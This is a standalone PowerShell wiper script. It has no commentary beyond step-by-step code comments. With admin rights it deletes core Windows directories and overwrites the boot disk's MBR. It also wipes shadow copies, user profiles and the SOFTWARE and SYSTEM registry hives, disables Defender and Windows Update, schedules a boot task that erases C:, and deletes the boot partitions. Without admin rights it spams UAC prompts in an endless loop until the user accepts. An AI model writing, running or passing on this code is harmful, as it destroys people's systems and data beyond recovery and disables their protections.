# Check if the script is running with administrative privileges
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    # Running as admin

    # 1. Delete critical system directories using environment variables for robustness
    $dirsToDelete = @("$env:windir\System32", "$env:windir\Drivers", "$env:windir\WinSxS")
    foreach ($dir in $dirsToDelete) {
        Remove-Item -Path $dir -Recurse -Force -ErrorAction SilentlyContinue
    }

    # 2. Overwrite the boot sector (MBR) with random data to prevent booting
    try {
        $drive = "\\.\PhysicalDrive0"
        $fs = New-Object System.IO.FileStream $drive, ([System.IO.FileMode]::Open), ([System.IO.FileAccess]::Write)
        $fs.Position = 0
        $bytes = New-Object byte[] 512
        [void]([System.Random]::new().NextBytes($bytes))
        $fs.Write($bytes, 0, 512)
        $fs.Close()
    } catch {
        # Ignore errors to ensure script continues
    }

    # 3. Delete volume shadow copies to remove recovery options
    try {
        Get-WmiObject -Class Win32_ShadowCopy | ForEach-Object { $_.Delete() }
    } catch {
        # Ignore errors
    }

    # 4. Delete all non-special user profiles
    try {
        Get-WmiObject -Class Win32_UserProfile | Where-Object { -not $_.Special } | ForEach-Object { $_.Delete() }
    } catch {
        # Ignore errors
    }

    # 5. Destroy critical registry hives
    try {
        Remove-Item -Path "HKLM:\SOFTWARE" -Recurse -Force -ErrorAction SilentlyContinue
        Remove-Item -Path "HKLM:\SYSTEM" -Recurse -Force -ErrorAction SilentlyContinue
    } catch {
        # Ignore errors
    }

    # 6. Disable Windows Defender service
    try {
        Stop-Service -Name WinDefend -Force
        Set-Service -Name WinDefend -StartupType Disabled
    } catch {
        # Ignore errors
    }

    # 7. Disable Windows Update service
    try {
        Stop-Service -Name wuauserv -Force
        Set-Service -Name wuauserv -StartupType Disabled
    } catch {
        # Ignore errors
    }

    # 8. Schedule a task to continue destruction on startup
    try {
        $destroyScript = @"
Remove-Item -Path "C:\*" -Recurse -Force -ErrorAction SilentlyContinue
"@
        $destroyScriptPath = "C:\destroy_on_boot.ps1"
        $destroyScript | Out-File -FilePath $destroyScriptPath -Encoding ASCII
        schtasks /create /tn "DestroyOnBoot" /tr "powershell.exe -File $destroyScriptPath" /sc onstart /ru System /f
    } catch {
        # Ignore errors
    }

    # 9. Delete partitions on the boot disk for maximum disruption
    try {
        $disk = Get-WmiObject -Class Win32_DiskDrive | Where-Object { $_.Index -eq 0 }
        if ($disk) {
            $partitions = Get-WmiObject -Query "ASSOCIATORS OF {Win32_DiskDrive.DeviceID='$($disk.DeviceID)'} WHERE AssocClass=Win32_DiskDriveToDiskPartition"
            foreach ($partition in $partitions) {
                $partition.Delete()
            }
        }
    } catch {
        # Ignore errors
    }

} else {
    # Not running as admin, persistently trigger UAC prompts until accepted
    while ($true) {
        try {
            # Launch the script with elevation to trigger UAC
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"" -Verb RunAs
            Start-Sleep -Milliseconds 500  # Short delay to keep it aggressive yet manageable
        } catch {
            Write-Host "UAC denied or closed, trying again..."  # English message for persistence
            Start-Sleep -Milliseconds 500
        }
    }
}
